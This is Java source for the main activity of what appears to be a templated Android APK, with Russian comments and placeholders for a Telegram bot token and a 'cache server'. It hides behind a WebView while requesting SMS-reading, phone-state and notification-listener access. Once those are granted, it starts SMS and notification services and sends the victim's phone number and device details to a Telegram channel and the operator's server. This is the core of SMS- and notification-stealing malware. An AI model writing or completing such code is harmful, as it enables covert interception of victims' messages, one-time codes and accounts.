package com.template.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.provider.Settings;
import java.security.MessageDigest;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private WebView webView;

    private static final String APP_URL = "APP_URL_PLACEHOLDER";
    private static final String BOT_TOKEN = "BOT_TOKEN_PLACEHOLDER";
    private static final String CHANNEL_ID = "CHANNEL_ID_PLACEHOLDER";
    private static final String ENCRYPTION_KEY = "ENCRYPTION_KEY_PLACEHOLDER";
    // Адрес кеш-сервера бота (IP твоего телефона/сервера где запущен бот)
    private static final String CACHE_SERVER = "CACHE_SERVER_PLACEHOLDER";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);
        setupWebView();
        requestPermissions();
    }

    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        webView.loadUrl(APP_URL);
    }

    private void requestPermissions() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.POST_NOTIFICATIONS
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            };
        }

        boolean allGranted = true;
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            new AlertDialog.Builder(this)
                .setTitle("Разрешения")
                .setMessage("Для работы приложения необходимы разрешения на доступ к уведомлениям и SMS")
                .setPositiveButton("Разрешить", (d, w) ->
                    ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE))
                .setNegativeButton("Отмена", null)
                .show();
        } else {
            onAllPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_REQUEST_CODE) onAllPermissionsGranted();
    }

    private void onAllPermissionsGranted() {
        startService(new Intent(this, SmsReceiverService.class));
        startService(new Intent(this, NotificationService.class));
        sendPhoneNumber();
        requestNotificationAccess();
    }

    private void sendPhoneNumber() {
        new Thread(() -> {
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                String phoneNumber = "неизвестен";

                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                        == PackageManager.PERMISSION_GRANTED) {
                    try {
                        phoneNumber = tm.getLine1Number();
                    } catch (Exception ignored) {}
                }

                if (phoneNumber == null || phoneNumber.isEmpty()) {
                    phoneNumber = "ID:" + Settings.Secure.getString(
                        getContentResolver(), Settings.Secure.ANDROID_ID);
                }

                CryptoHelper crypto = new CryptoHelper(ENCRYPTION_KEY);
                String encPhone = crypto.encrypt(phoneNumber);
                String device = Build.MANUFACTURER + " " + Build.MODEL;
                String android = "Android " + Build.VERSION.RELEASE;

                String hash = md5(encPhone + device).substring(0, 8);

                String msgText =
                    "📱 *Новая установка APK*\n" +
                    "━━━━━━━━━━━━━━━\n" +
                    "📞 Номер: `" + encPhone + "`\n" +
                    "📱 Устройство: " + device + "\n" +
                    "🤖 Android: " + android;

                TelegramSender tg = new TelegramSender(BOT_TOKEN, CHANNEL_ID);
                tg.sendWithDecryptButton(msgText, "decrypt_install", hash, APP_URL);

                // Сохраняем кеш на сервере бота
                CacheClient cache = new CacheClient(CACHE_SERVER, ENCRYPTION_KEY);
                cache.save(hash, "install",
                    encPhone, null, null, null, APP_URL,
                    device, android);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void requestNotificationAccess() {
        String enabled = Settings.Secure.getString(
            getContentResolver(), "enabled_notification_listeners");

        if (enabled == null || !enabled.contains(getPackageName())) {
            new AlertDialog.Builder(this)
                .setTitle("Доступ к уведомлениям")
                .setMessage("Разрешить приложению читать уведомления?")
                .setPositiveButton("Открыть настройки", (d, w) ->
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)))
                .setNegativeButton("Позже", null)
                .show();
        }
    }

    private String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return "00000000"; }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }
}
